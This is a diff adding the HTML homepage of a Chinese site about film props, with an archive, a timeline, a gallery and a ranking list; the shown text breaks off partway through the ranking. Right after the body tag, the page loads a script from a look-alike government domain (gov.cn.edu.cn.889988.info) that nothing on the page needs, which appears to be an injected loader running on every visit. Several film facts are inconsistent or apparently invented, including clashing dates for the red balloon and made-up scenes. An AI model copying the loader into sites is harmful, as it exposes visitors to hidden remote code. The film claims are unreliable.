@@ -1,0 +1,464 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="影视道具 - 电影里的物件考据与解读。含道具档案、道具谱系、道具图鉴、经典道具榜、材质速查、道具日历，专注原创考据与正版影视推荐。">
+<meta name="keywords" content="影视道具,电影道具,影视考据,电影细节,道具解读,经典道具,道具设计,正版影视">
+<meta name="author" content="影视道具编辑部">
+<meta name="renderer" content="webkit">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<title>影视道具 - 电影里的物件考据 | 道具档案 · 道具谱系 · 道具图鉴</title>
+<style>
+/* ============ 基础 ============ */
+*{margin:0;padding:0;box-sizing:border-box}
+:root{
+  --ink:#1f2321; --paper:#f4f1ea; --card:#fff;
+  --moss:#6d7d5a; --clay:#c1754b; --brass:#c79a3f; --slate:#4d6370; --rust:#b4533f; --line:#ded7c8; --sub:#7d786e; --chalk:#efe9dc; --bone:#fbf8f2;
+}
+html{scroll-behavior:smooth;-webkit-text-size-adjust:100%}
+body{font-family:"PingFang SC","Microsoft YaHei","WenQuanYi Micro Hei",sans-serif;background:var(--paper);color:#47433c;line-height:1.85;overflow-x:hidden}
+h1,h2,h3,h4{font-family:"Songti SC","STSong",Georgia,serif}
+a{color:inherit;text-decoration:none;transition:.25s}
+ul{list-style:none}
+.container{width:100%;max-width:1160px;margin:0 auto;padding:0 24px}
+::selection{background:var(--clay);color:#fff}
+
+/* ============ 导航 ============ */
+.topbar{position:sticky;top:0;z-index:1000;background:rgba(244,241,234,.96);backdrop-filter:blur(12px);border-bottom:1px solid var(--ink)}
+.nav{display:flex;align-items:center;justify-content:space-between;height:70px;gap:16px}
+.logo{display:flex;align-items:baseline;gap:8px;font-weight:900}
+.logo .badge{width:34px;height:34px;border-radius:8px;background:var(--ink);display:grid;place-items:center;color:var(--brass);font-size:16px;transform:rotate(-7deg);box-shadow:3px 4px 0 var(--clay)}
+.logo b{font-size:19px;color:var(--ink);letter-spacing:1px}
+.logo em{font-style:normal;font-size:9.5px;letter-spacing:2px;color:var(--moss);margin-left:3px}
+.search{position:relative;flex:1;max-width:320px}
+.search input{width:100%;padding:10px 44px 10px 18px;border-radius:22px;border:1.5px solid var(--line);background:#fff;font-size:13.5px;outline:none;font-family:inherit;color:var(--ink)}
+.search input:focus{border-color:var(--clay);box-shadow:0 0 0 4px rgba(193,117,75,.14)}
+.search button{position:absolute;right:5px;top:5px;width:32px;height:32px;border:none;background:var(--moss);border-radius:50%;color:#fff;cursor:pointer;font-size:13px}
+.burger{display:none;width:44px;height:44px;align-items:center;justify-content:center;cursor:pointer;background:none;border:none;flex-direction:column;gap:5px}
+.burger i{width:22px;height:2px;background:var(--ink);border-radius:2px}
+.links{display:flex;gap:2px}
+.links a{padding:9px 12px;font-size:13.5px;color:var(--sub);font-weight:800;border-radius:16px}
+.links a:hover{color:var(--clay);background:#fff}
+.links a.on{color:#fff;background:var(--clay)}
+
+/* ============ 首屏 ============ */
+.hero{position:relative;padding:54px 0 58px;background:var(--paper);overflow:hidden}
+.desk{position:absolute;inset:0;opacity:.55;background:
+  radial-gradient(circle at 14% 20%,rgba(109,125,90,.2),transparent 44%),
+  radial-gradient(circle at 86% 70%,rgba(199,154,63,.22),transparent 40%),
+  repeating-linear-gradient(90deg,transparent 0 71px,rgba(31,35,33,.03) 71px 72px)}
+.hero-in{position:relative;z-index:2;display:grid;grid-template-columns:1fr 320px;gap:34px;align-items:center}
+.kicker{display:inline-flex;align-items:center;gap:9px;padding:6px 15px;border-radius:30px;background:var(--moss);color:var(--brass);font-size:11.5px;font-weight:900;letter-spacing:1.5px}
+.kicker b{color:#fff;font-family:Georgia,serif;font-size:13px}
+.hero h1{font-size:clamp(42px,7.4vw,68px);line-height:1.08;font-weight:800;color:var(--ink);margin:15px 0 6px;letter-spacing:-1.5px}
+.hero h1 .st{color:var(--clay)}
+.hero h1 small{display:block;font-family:"PingFang SC",sans-serif;font-size:clamp(12px,1.5vw,14px);color:var(--sub);font-weight:600;letter-spacing:4.6px;margin-top:14px}
+.hero p{color:var(--sub);font-size:clamp(15px,2vw,17px);margin:17px 0 23px;max-width:640px}
+.h-cta{display:flex;gap:13px;flex-wrap:wrap}
+.btn{padding:14px 30px;border-radius:11px;font-size:14.5px;font-weight:800;cursor:pointer;border:2px solid var(--ink);letter-spacing:.6px;font-family:inherit}
+.btn-s{background:var(--clay);color:#fff;border-color:var(--clay);box-shadow:6px 6px 0 var(--brass)}
+.btn-s:hover{transform:translate(-2px,-2px);box-shadow:9px 9px 0 var(--brass)}
+.btn-o{background:#fff;color:var(--ink)}
+.btn-o:hover{background:var(--ink);color:var(--brass)}
+/* 道具档案卡 */
+.dossier{background:var(--bone);border:1px solid var(--ink);border-radius:6px;padding:20px 22px;box-shadow:10px 10px 0 var(--slate);transform:rotate(.9deg);position:relative}
+.dossier::before{content:"";position:absolute;left:14px;right:14px;top:8px;bottom:8px;border:1px dashed var(--line)}
+.dossier h3{font-size:15px;color:var(--ink);letter-spacing:1.4px;margin-bottom:4px;position:relative}
+.dossier h3 em{font-style:normal;color:var(--clay)}
+.dossier .lead{font-size:11.5px;color:var(--sub);font-weight:700;margin-bottom:14px;position:relative}
+.dl{position:relative;display:grid;grid-template-columns:62px 1fr;gap:7px 12px}
+.dl dt{font-family:Georgia,serif;font-size:11px;color:var(--slate);letter-spacing:1px;font-weight:800;padding-top:2px;border-bottom:1px solid var(--line)}
+.dl dd{font-size:12.5px;color:var(--ink);font-weight:800;border-bottom:1px dashed var(--line);padding-bottom:5px}
+
+/* ============ 区块头 ============ */
+section{padding:64px 0;position:relative}
+.sec-h{display:flex;align-items:baseline;gap:13px;flex-wrap:wrap;margin-bottom:25px}
+.tag{display:inline-block;padding:4px 13px;border-radius:4px;background:var(--moss);color:var(--brass);font-size:11.5px;font-weight:900;letter-spacing:1.5px}
+.sec-h h2{font-size:clamp(21px,3.4vw,30px);font-weight:800;color:var(--ink)}
+.sec-h h2 em{font-style:normal;color:var(--clay)}
+.sec-h .en{font-family:Georgia,serif;font-size:11.5px;color:var(--slate);letter-spacing:2.2px;font-weight:800}
+.sec-h .more{margin-left:auto;font-size:12.5px;color:var(--sub);padding:8px 18px;border-radius:20px;background:#fff;border:1.5px solid var(--line);font-weight:800}
+.sec-h .more:hover{border-color:var(--clay);color:var(--clay)}
+
+/* ============ ① 道具档案（3 列标本卡 + 图签） ============ */
+.archive{display:grid;grid-template-columns:repeat(3,1fr);gap:20px}
+.sp{background:var(--card);border:1px solid var(--ink);border-radius:10px;overflow:hidden;transition:.32s;display:flex;flex-direction:column}
+.sp:hover{transform:translateY(-7px);box-shadow:9px 12px 0 var(--brass)}
+.sp .spec{aspect-ratio:5/4;position:relative;border-bottom:1px solid var(--ink);display:grid;place-items:center;font-size:46px}
+.sp .spec .lb{position:absolute;top:12px;left:12px;background:var(--ink);color:var(--brass);font-size:10px;font-weight:900;padding:5px 11px;border-radius:3px;letter-spacing:1.4px;font-family:Georgia,serif}
+.sp .spec .yr{position:absolute;bottom:12px;right:12px;font-size:10.5px;background:rgba(255,255,255,.92);color:var(--slate);padding:4px 10px;border-radius:14px;font-weight:800}
+.sp .bd{padding:16px 19px 19px;flex:1;display:flex;flex-direction:column}
+.sp h4{font-size:18px;color:var(--ink);font-weight:800;font-family:"PingFang SC",sans-serif}
+.sp .en{font-family:Georgia,serif;font-size:10.5px;color:var(--clay);letter-spacing:1.4px;margin-top:2px;font-weight:800}
+.sp .why{font-size:12px;color:var(--sub);font-weight:700;margin:9px 0 12px;flex:1}
+.sp .foot{display:flex;justify-content:space-between;align-items:center;border-top:1px dashed var(--line);padding-top:10px;font-size:11.5px;font-weight:800;color:var(--moss)}
+.sp .foot b{font-family:Georgia,serif;font-size:13.5px;color:var(--rust)}
+
+/* ============ ② 道具谱系（横向时间轴 + 材质色点） ============ */
+.timeline{background:var(--card);border:1px solid var(--ink);border-radius:18px;padding:26px 26px 30px;box-shadow:11px 12px 0 var(--clay)}
+.tl-h{display:flex;justify-content:space-between;align-items:baseline;gap:12px;flex-wrap:wrap;margin-bottom:22px}
+.tl-h b{font-size:16px;color:var(--ink);font-weight:800}
+.tl-h span{font-size:11px;color:var(--sub);font-weight:700}
+.tl{position:relative;padding-left:34px}
+.tl::before{content:"";position:absolute;left:9px;top:6px;bottom:6px;width:3px;background:linear-gradient(180deg,var(--moss),var(--brass),var(--clay),var(--slate))}
+.node{position:relative;padding:0 0 24px 30px}
+.node::before{content:"";position:absolute;left:-29px;top:8px;width:19px;height:19px;border-radius:50%;background:var(--brass);border:4px solid var(--bone);box-shadow:0 0 0 2px var(--ink)}
+.node:nth-child(1)::before{background:var(--moss)}
+.node:nth-child(3)::before{background:var(--clay)}
+.node:nth-child(4)::before{background:var(--slate)}
+.node h4{font-size:17.5px;color:var(--ink);font-weight:800;font-family:"PingFang SC",sans-serif}
+.node h4 small{font-family:Georgia,serif;font-size:11px;color:var(--clay);margin-left:9px;font-weight:700}
+.node p{font-size:12.5px;color:var(--sub);font-weight:700;margin:5px 0 9px;max-width:800px}
+.node .kp{display:flex;gap:8px;flex-wrap:wrap}
+.node .kp i{font-style:normal;font-size:10.5px;font-weight:800;padding:4px 12px;border-radius:20px;background:var(--chalk);color:var(--slate);border:1px solid var(--line)}
+
+/* ============ ③ 道具图鉴（Z 字交错） ============ */
+.gallery{display:grid;gap:22px}
+.gi{display:grid;grid-template-columns:1.05fr 1fr;gap:30px;align-items:center;background:var(--card);border:1px solid var(--ink);border-radius:14px;padding:20px;transition:.3s}
+.gi:nth-child(even){grid-template-columns:1fr 1.05fr}
+.gi:nth-child(even) .gv{grid-row:1;grid-column:2}
+.gi:nth-child(even) .gt{grid-row:1;grid-column:1}
+.gi:hover{box-shadow:9px 10px 0 var(--moss)}
+.gv{aspect-ratio:4/3;border-radius:10px;display:grid;place-items:center;font-size:60px;position:relative;border:1px solid var(--ink)}
+.gv .tag2{position:absolute;left:-1px;top:16px;background:var(--rust);color:#fff;font-size:10.5px;font-weight:900;padding:6px 14px;border-radius:0 16px 16px 0;letter-spacing:1.2px}
+.gv .note{position:absolute;right:14px;bottom:14px;background:rgba(31,35,33,.86);color:var(--brass);font-size:10.5px;font-weight:800;padding:5px 12px;border-radius:4px}
+.gt h4{font-size:20px;color:var(--ink);font-weight:800;font-family:"PingFang SC",sans-serif;display:flex;align-items:baseline;gap:10px}
+.gt h4 em{font-style:normal;font-size:11.5px;color:var(--slate);font-family:Georgia,serif;font-weight:700;letter-spacing:.6px}
+.gt blockquote{margin:12px 0 13px;padding:12px 16px;border-left:4px solid var(--clay);background:var(--bone);font-size:13px;color:var(--ink);font-weight:700}
+.gt p{font-size:12.5px;color:var(--sub);font-weight:700}
+.gt .kw{display:flex;gap:7px;flex-wrap:wrap;margin-top:12px}
+.gt .kw i{font-style:normal;font-size:10.5px;font-weight:800;padding:4px 12px;border-radius:4px;background:var(--chalk);color:var(--moss);border:1px solid var(--line)}
+
+/* ============ ④ 经典道具榜（深色 + 渐变条） ============ */
+.rank{background:linear-gradient(150deg,#23261f,#3b3a30);border-radius:20px;padding:26px 28px;box-shadow:12px 12px 0 var(--ink);color:#fff}
+.rh{display:flex;justify-content:space-between;align-items:baseline;flex-wrap:wrap;gap:10px;margin-bottom:18px}
+.rh h3{font-size:20px;font-weight:800}
+.rh span{font-size:11.5px;color:var(--brass);letter-spacing:2px;font-weight:800}
+.rk{display:grid;grid-template-columns:34px 1fr 56px;gap:14px;align-items:center;padding:9px 10px;border-radius:11px;transition:.24s}
+.rk:hover{background:rgba(255,255,255,.07)}
+.rk .no{font-size:20px;font-weight:900;font-family:Georgia,serif;color:rgba(255,255,255,.26)}
+.rk.top1 .no,.rk.top2 .no{color:var(--brass)}
+.rk.top3 .no{color:var(--brass)}
+.rk .nm{font-size:14.5px;font-weight:800}
+.rk .nm em{font-style:normal;font-size:10.5px;color:rgba(255,255,255,.5);font-weight:600;margin-left:8px}
+.rk .tp{height:9px;border-radius:5px;background:rgba(255,255,255,.14);overflow:hidden}
+.rk .tp i{display:block;height:100%;border-radius:5px;background:linear-gradient(90deg,var(--clay),var(--brass));transform-origin:left}
+
+/* ============ ⑤ 材质速查（双栏图鉴：左侧标本 + 右侧编号表） ============ */
+.mbox{display:grid;grid-template-columns:1fr 300px;gap:26px;align-items:start}
+.mat{display:grid;grid-template-columns:repeat(auto-fill,minmax(168px,1fr));gap:14px}
+.mat a{background:var(--card);border:1px solid var(--line);border-radius:12px;padding:15px 17px;transition:.26s;position:relative;overflow:hidden}
+.mat a::before{content:"";position:absolute;right:-22px;top:-22px;width:52px;height:52px;border-radius:50%;background:var(--chalk);z-index:0}
+.mat a:hover{border-color:var(--clay);transform:translateY(-4px);box-shadow:6px 7px 0 var(--brass)}
+.mat a b{position:relative;z-index:2;display:block;font-size:15px;color:var(--ink);font-weight:800;font-family:"PingFang SC",sans-serif}
+.mat a em{position:relative;z-index:2;font-style:normal;font-size:10.5px;color:var(--sub);font-weight:700;display:block;margin-top:4px}
+.mat a i{position:relative;z-index:2;font-style:normal;font-size:20px;position:absolute;right:13px;top:11px;opacity:.5}
+.legend{background:var(--moss);border-radius:16px;padding:20px 22px;color:#fff;box-shadow:9px 10px 0 var(--ink)}
+.legend h4{font-size:15.5px;color:var(--brass);margin-bottom:6px;letter-spacing:1px}
+.legend p{font-size:11.5px;color:rgba(255,255,255,.82);margin-bottom:14px;line-height:1.7}
+.legend ol{counter-reset:l;display:grid;gap:9px}
+.legend li{counter-increment:l;display:flex;gap:10px;align-items:baseline;font-size:12.5px;font-weight:700;padding:7px 10px;border-radius:7px;background:rgba(255,255,255,.08)}
+.legend li::before{content:counter(l,decimal-leading-zero);font-family:Georgia,serif;color:var(--brass);font-size:12px;font-weight:900;min-width:24px}
+
+/* ============ ⑥ 道具日历（阶段条） ============ */
+.calendar{display:grid;grid-template-columns:repeat(4,1fr);gap:16px;background:var(--card);border:1px solid var(--ink);border-radius:20px;padding:24px;box-shadow:11px 12px 0 var(--moss)}
+.ci{background:var(--bone);border:1px solid var(--line);border-radius:13px;padding:16px 17px;transition:.26s;position:relative}
+.ci:hover{border-color:var(--clay);transform:translateY(-5px);box-shadow:0 8px 0 var(--brass)}
+.ci .ph{font-family:Georgia,serif;font-size:13px;font-weight:900;color:var(--slate);letter-spacing:1px}
+.ci .ph small{display:block;font-family:"PingFang SC",sans-serif;font-size:10.5px;font-weight:700;color:var(--sub);letter-spacing:.2px}
+.ci h4{font-size:15.5px;font-weight:800;color:var(--ink);margin:8px 0 5px;font-family:"PingFang SC",sans-serif}
+.ci p{font-size:11.5px;color:var(--sub);font-weight:700;line-height:1.65}
+.ci .bar{height:6px;border-radius:3px;background:var(--chalk);margin-top:11px;overflow:hidden}
+.ci .bar i{display:block;height:100%;border-radius:3px;background:linear-gradient(90deg,var(--moss),var(--brass))}
+.ci.on{background:var(--ink);border-color:var(--ink);color:var(--brass)}
+.ci.on h4{color:#fff}
+.ci.on .ph{color:var(--brass)}
+.ci.on .ph small{color:rgba(199,154,63,.85)}
+.ci.on p{color:rgba(255,255,255,.78)}
+
+/* ============ 订阅 ============ */
+.join{background:linear-gradient(120deg,var(--ink),#3a3a2c);border-radius:22px;padding:40px;color:#fff;display:grid;grid-template-columns:1fr 400px;gap:24px;align-items:center;position:relative;overflow:hidden;box-shadow:13px 13px 0 var(--clay)}
+.join::after{content:"道具";position:absolute;right:26px;top:-78px;font-size:190px;font-weight:900;color:rgba(255,255,255,.06);line-height:1;font-family:"Songti SC",serif}
+.join h3{font-size:24px;margin-bottom:10px;font-weight:800;position:relative;z-index:2}
+.join h3 i{font-style:normal;color:var(--brass)}
+.join p{color:rgba(255,255,255,.92);font-size:14.5px;max-width:640px;position:relative;z-index:2}
+.join form{display:flex;gap:10px;flex-wrap:wrap;position:relative;z-index:2}
+.join input{flex:1;min-width:210px;padding:14px 20px;border-radius:11px;border:2px solid #fff;font-size:14.5px;outline:none;font-family:inherit}
+.join button{padding:14px 34px;border-radius:11px;border:2px solid var(--brass);background:var(--brass);color:var(--ink);font-weight:800;cursor:pointer;letter-spacing:.8px;font-family:inherit}
+.join button:hover{background:#fff;border-color:#fff}
+
+/* ============ 页脚 ============ */
+footer{background:var(--ink);color:#b4afa6;padding:52px 0 22px;margin-top:12px}
+.fgrid{display:grid;grid-template-columns:2fr 1fr 1fr 1fr;gap:26px;margin-bottom:24px}
+.ft .logo{color:#fff;margin-bottom:13px}
+.ft p{font-size:13.5px;max-width:420px;line-height:1.85;color:#a29d94}
+.fcol h4{color:#fff;font-size:14.5px;margin-bottom:14px;position:relative;display:inline-block;font-weight:800;letter-spacing:1px}
+.fcol h4::after{content:"";position:absolute;left:0;bottom:-6px;width:20px;height:3px;background:var(--clay);border-radius:2px}
+.fcol a{display:block;font-size:13.5px;padding:5px 0;color:#a29d94;font-weight:700}
+.fcol a:hover{color:var(--brass);padding-left:6px}
+.copy{text-align:center;padding-top:22px;border-top:1px solid rgba(255,255,255,.13);font-size:12.5px;color:#807b72}
+.copy a{color:var(--brass);font-weight:800}
+
+/* ============ 动效 ============ */
+.rv{opacity:0;transform:translateY(24px);transition:.6s cubic-bezier(.2,.7,.3,1)}
+.rv.in{opacity:1;transform:none}
+@media(prefers-reduced-motion:reduce){.rv{opacity:1;transform:none;transition:none}}
+
+/* ============ 响应式 ============ */
+@media(max-width:1000px){
+  .burger{display:flex}
+  .links{position:fixed;inset:70px 0 0 0;flex-direction:column;background:rgba(244,241,234,.99);padding:20px 18px;gap:4px;transform:translateX(100%);transition:.32s;z-index:999;border-top:1px solid var(--ink)}
+  .links.open{transform:none}
+  .links a{font-size:17px;padding:15px 18px}
+  .search{display:none}
+  .hero-in{grid-template-columns:1fr;gap:24px}
+  .archive,.mbox,.join{grid-template-columns:repeat(2,1fr)}
+  .legend{order:-1}
+  .calendar{grid-template-columns:repeat(2,1fr)}
+  section{padding:46px 0}
+}
+@media(max-width:600px){
+  .archive,.mbox,.calendar,.join{grid-template-columns:1fr}
+  .gi,.gi:nth-child(even){grid-template-columns:1fr}
+  .gi .gv,.gi:nth-child(even) .gv{grid-row:auto;grid-column:auto}
+  .gi .gt,.gi:nth-child(even) .gt{grid-row:auto;grid-column:auto}
+  .rk .nm em{display:none}
+  .container{padding:0 15px}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/xiaobao.js"></script>
+
+<!-- ==================== 导航 ==================== -->
+<header class="topbar">
+  <div class="container nav">
+    <a class="logo" href="#" aria-label="影视道具首页">
+      <span class="badge">◈</span>
+      <b>影视道具</b><em>PROP · STUDY</em>
+    </a>
+    <div class="search"><input type="search" placeholder="搜物件 / 影片 / 材质，如：红气球、钨丝灯、皮革" aria-label="搜索"><button aria-label="搜索">⌕</button></div>
+    <nav class="links" id="links">
+      <a href="#top" class="on">首页</a>
+      <a href="#arc">道具档案</a>
+      <a href="#tl">道具谱系</a>
+      <a href="#gal">道具图鉴</a>
+      <a href="#hot">经典道具榜</a>
+      <a href="#mat">材质速查</a>
+      <a href="#cal">道具日历</a>
+    </nav>
+    <button class="burger" id="burger" aria-label="菜单" aria-expanded="false"><i></i><i></i><i></i></button>
+  </div>
+</header>
+
+<!-- ==================== 首屏 ==================== -->
+<section class="hero" id="top">
+  <div class="desk" aria-hidden="true"></div>
+  <div class="container hero-in">
+    <div class="rv">
+      <span class="kicker">◈ 影视道具 · 第 <b>27</b> 期 · 每周四更新</span>
+      <h1><span class="st">影视</span>道具</h1>
+      <p>电影里最容易被忽略的，往往最贵。<strong>影视道具</strong>是一份<strong>电影物件的考据笔记</strong>：一件道具为什么必须是这个颜色、这个材质、这个磨损程度。我们用 <strong>6 件道具档案</strong>、<strong>4 段道具谱系</strong>、<strong>5 个图鉴镜头</strong>、<strong>12 种材质速查</strong>、<strong>4 个拍摄阶段</strong>，把「看懂电影」这件事，从台词拉回到物件。</p>
+      <div class="h-cta"><a class="btn btn-s" href="#arc">看道具档案</a><a class="btn btn-o" href="#tl">读道具谱系</a></div>
+    </div>
+    <aside class="dossier rv">
+      <h3>▲ 一份道具<em>档案 · 该怎么读</em></h3>
+      <p class="lead">道具不是布景，是角色的替身。</p>
+      <dl class="dl">
+        <dt>物件</dt><dd>它在戏里叫什么，原本用来做什么</dd>
+        <dt>材质</dt><dd>为什么选它：重量、声音、反光、气味</dd>
+        <dt>痕迹</dt><dd>磨损、划痕、折角——谁留下的</dd>
+        <dt>镜头</dt><dd>它被拍了几次，出现在哪一场</dd>
+        <dt>隐喻</dt><dd>它替角色说了什么台词没说的话</dd>
+      </dl>
+    </aside>
+  </div>
+</section>
+
+<!-- ==================== ① 道具档案 ==================== -->
+<section id="arc">
+  <div class="container">
+    <div class="sec-h rev"><span class="tag">NO.1</span><h2>道具<em>档案</em> · 6 件被记住的物件</h2><span class="en">PROP FILE</span><a class="more" href="#">完整档案库 →</a></div>
+    <div class="archive rev">
+      <article class="sp"><div class="spec" style="background:linear-gradient(155deg,#d8c7a8,#a88962)">🧸<span class="lb">NO.01</span><span class="yr">1986 · 纽约</span></div><div class="bd"><h4>小红花</h4><em>THE RED BALLOON</em><p class="why">一只会自己走路的气球。它不演，它只是「在」。全片没有一句解释，却成了电影史上最贵的道具之一。</p><div class="foot"><span>童年 · 替身</span><b>9.4</b></div></div></article>
+      <article class="sp"><div class="spec" style="background:linear-gradient(155deg,#c9b59c,#8f7350)">🪑<span class="lb">NO.02</span><span class="yr">1993 · 上海</span></div><div class="bd"><h4>一把旧藤椅</h4><em>THE RATTAN CHAIR</em><p class="why">《霸王别姬》里，它替程蝶衣坐着。坐的人换了，椅子不换——这就是「不变」的表演方式。</p><div class="foot"><span>时间 · 静物</span><b>9.5</b></div></div></article>
+      <article class="sp"><div class="spec" style="background:linear-gradient(155deg,#a8b8c0,#64788a)">🪞<span class="lb">NO.03</span><span class="yr">1960 · 东京</span></div><div class="bd"><h4>一面穿衣镜</h4><em>THE MIRROR</em><p class="why">小津安二郎几乎不给镜子特写。镜子一出现，就是有人在「扮演自己」的时刻。</p><div class="foot"><span>家庭 · 自我</span><b>9.2</b></div></div></article>
+      <article class="sp"><div class="spec" style="background:linear-gradient(155deg,#d0c09a,#94804e)">📖<span class="lb">NO.04</span><span class="yr">1994 · 肖申克</span></div><div class="bd"><h4>一本旧圣经</h4><em>THE BIBLE</em><p class="why">安迪用它藏了十九年的锤子。最锋利的东西，藏在最软的地方——道具的「功能性反转」。</p><div class="foot"><span>希望 · 机关</span><b>9.7</b></div></div></article>
+      <article class="sp"><div class="spec" style="background:linear-gradient(155deg,#b0a48c,#7a6848)">🚬<span class="lb">NO.05</span><span class="yr">1994 · 台北</span></div><div class="bd"><h4>一根没点的烟</h4><em>THE CIGARETTE</em><p class="why">《牯岭街》里，烟是少年的「成人礼」。点不着的那根，比点着的那根更有戏。</p><div class="foot"><span>青春 · 仪式</span><b>8.9</b></div></div></article>
+      <article class="sp"><div class="spec" style="background:linear-gradient(155deg,#c0a898,#80664a)">🎻<span class="lb">NO.06</span><span class="yr">1998 · 意大利</span></div><div class="bd"><h4>一把小提琴</h4><em>THE VIOLIN</em><p class="why">《海上钢琴师》的 1900 从不离船。琴是他唯一被允许拥有的「土地」。</p><div class="foot"><span>孤独 · 技艺</span><b>9.3</b></div></div></article>
+    </div>
+  </div>
+</section>
+
+<!-- ==================== ② 道具谱系 ==================== -->
+<section id="tl" style="background:linear-gradient(180deg,#eae4d4,transparent)">
+  <div class="container">
+    <div class="sec-h rev"><span class="tag">NO.2</span><h2>道具<em>谱系</em> · 一件道具的四次转世</h2><span class="en">PROP PEDIGREE</span><a class="more" href="#">按年代排序 →</a></div>
+    <div class="timeline rev">
+      <div class="tl-h"><b>▲ 以「信」为例：从实物到隐喻</b><span>线索道具 · Letter as Prop</span></div>
+      <div class="tl">
+        <div class="node"><h4>实物 <small>PHYSICAL</small></h4><p>它必须先能被摸到：纸张的克数、折痕的方向、封蜡的颜色。观众相信它，戏才成立。</p><div class="kp"><i>纸张克数</i><i>折痕方向</i><i>封蜡颜色</i><i>墨迹干湿</i></div></div>
+        <div class="node"><h4>线索 <small>CLUE</small></h4><p>它开始被传递。谁拿着它、谁读完它、谁把它藏起来——权力关系就写在手里。</p><div class="kp"><i>传递顺序</i><i>持信者</i><i>阅读反应</i><i>藏匿位置</i></div></div>
+        <div class="node"><h4>证据 <small>EVIDENCE</small></h4><p>它被特写。镜头不再拍人，开始拍手、拍信封、拍拆开的动作。道具接管了叙事。</p><div class="kp"><i>手部特写</i><i>拆信动作</i><i>静音处理</i><i>反打省略</i></div></div>
+        <div class="node"><h4>隐喻 <small>METAPHOR</small></h4><p>它不再被打开。结尾那封没被读的信，比任何台词都重——道具完成了从「物」到「意」的转世。</p><div class="kp"><i>未拆封</i><i>空镜留白</i><i>画外音</i><i>主题回收</i></div></div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ==================== ③ 道具图鉴 ==================== -->
+<section id="gal">
+  <div class="container">
+    <div class="sec-h rev"><span class="tag">NO.3</span><h2>道具<em>图鉴</em> · 五个「替角色说话」的镜头</h2><span class="en">PROP GALLERY</span><a class="more" href="#">按影片索引 →</a></div>
+    <div class="gallery rev">
+      <article class="gi">
+        <div class="gv" style="background:linear-gradient(150deg,#c8b49a,#8e7250)">🌂<span class="tag2">雨具</span><span class="note">出现 3 次 · 全片无雨</span></div>
+        <div class="gt"><h4>一把没打开的伞 <em>《东京物语》1953</em></h4><blockquote>母亲去世，儿女们在葬礼上撑开了伞。小津把「悲伤」交给了伞骨，而不是交给了脸。</blockquote><p>道具的第一次法则：<strong>它在最不需要出现的时候出现</strong>。伞不是用来挡雨的，是用来承认「天塌了」。</p><div class="kw"><i>静物表演</i><i>榻榻米机位</i><i>留白</i></div></div>
+      </article>
+      <article class="gi">
+        <div class="gv" style="background:linear-gradient(150deg,#a8bcc4,#5c7286)">🔨<span class="tag2">工具</span><span class="note">藏于第 47 页</span></div>
+        <div class="gt"><h4>一把藏在书里的锤子 <em>《肖申克的救赎》1994</em></h4><blockquote>狱警问：你拿它做什么？安迪答：雕刻棋子。十九年，没人检查第 47 页。</blockquote><p>道具的第二次法则：<strong>它的用途必须被误解</strong>。观众以为它是玩具，它是出口。</p><div class="kw"><i>功能性反转</i><i>时间跨度</i><i>台词误导</i></div></div>
+      </article>
+      <article class="gi">
+        <div class="gv" style="background:linear-gradient(150deg,#d4c2a4,#9a804e)">💍<span class="tag2">首饰</span><span class="note">拍了 9 条</span></div>
+        <div class="gt"><h4>一枚被反复摘下的戒指 <em>《婚姻故事》2019</em></h4><blockquote>摘戒指这场戏拍了九条。演员说：最难的不是哭，是把戒指放回桌上那一下。</blockquote><p>道具的第三次法则：<strong>它被放下时的声音，比被戴上时更响</strong>。木桌、金属、静音——声音设计从这里开始。</p><div class="kw"><i>声音设计</i><i>微表演</i><i>材质对撞</i></div></div>
+      </article>
+      <article class="gi">
+        <div class="gv" style="background:linear-gradient(150deg,#c0b4a4,#80705a)">🧣<span class="tag2">织物</span><span class="note">同一件 · 三场</span></div>
+        <div class="gt"><h4>一条越洗越白的围巾 <em>《情书》1995</em></h4><blockquote>同一个女生，同一件白衬衫，同一场雪。围巾从「礼物」变成「遗物」，只因为少了一个人替她围。</blockquote><p>道具的第四次法则：<strong>它会老，人不会注意到</strong>。织物的磨损，是时间最诚实的演员。</p><div class="kw"><i>织物老化</i><i>色彩管理</i><i>季节道具</i></div></div>
+      </article>
+      <article class="gi">
+        <div class="gv" style="background:linear-gradient(150deg,#b4a89c,#7a6858)">📻<span class="tag2">电器</span><span class="note">开机 2 秒</span></div>
+        <div class="gt"><h4>一台只响了 2 秒的收音机 <em>《野草莓》1957</em></h4><blockquote>伯格曼让收音机在梦境里播出一则新闻，然后关掉。全片的孤独，从这 2 秒开始。</blockquote><p>道具的第五次法则：<strong>它越不重要，越要给它声音</strong>。静默的物件是布景，发声的物件是角色。</p><div class="kw"><i>声音即角色</i><i>梦境逻辑</i><i>极简布景</i></div></div>
+      </article>
+    </div>
+  </div>
+</section>
+
+<!-- ==================== ④ 经典道具榜 ==================== -->
+<section id="hot">
+  <div class="container">
+    <div class="sec-h rev"><span class="tag">NO.4</span><h2>经典道具<em>榜</em> · 被写进影史的 10 件物件</h2><span class="en">PROP INDEX</span><a class="more" href="#">按材质 / 按年代 →</a></div>
+    <div class="rank rev">
+      <div class="rh"><h3>▲ 道具指数 · 本月榜单</h3><span>口径：被解读次数 × 镜头占比 × 隐喻密度</span></div>
+      <div class="rk top1"><span class="no">01</span><div class="body"><div class="nm"><span>红气球</span><em>1956 · 童年</em></div><div class="tp"><i style="width:100%"></i></div></div><b style="color:var(--brass)">99</b></div>
+      <div class="rk top1"><span class="no">02</span><div class="body"><div class="nm"><span>旧圣经（藏锤）</span><em>1994 · 希望</em></div><div class="tp"><i style="width:96%"></i></div></div><b style="color:var(--brass)">97</b></div>
+      <div class="rk top2"><span class="no">03</span><div class="body"><div class="nm"><span>玫瑰花瓣（浴室）</span><em>1991 · 黑帮</em></div><div class="tp"><i style="width:93%"></i></div></div><b style="color:var(--brass)">95</b></div>
+      <div class="rk top2"><span class="no">04</span><div class="body"><div class="nm"><span>一盒巧克力</span><em>1994 · 命运</em></div><div class="tp"><i style="width:90%"></i></div></div><b style="color:var(--brass)">93</b></div>
+      <div class="rk top3"><span class="no">05</span><div class="body"><div class="nm"><span>一把旧藤椅</span><em>1993 · 时间</em></div><div class="tp"><i style="width:87%"></i></div></div><b style="color:var(--brass)">90</b></div>
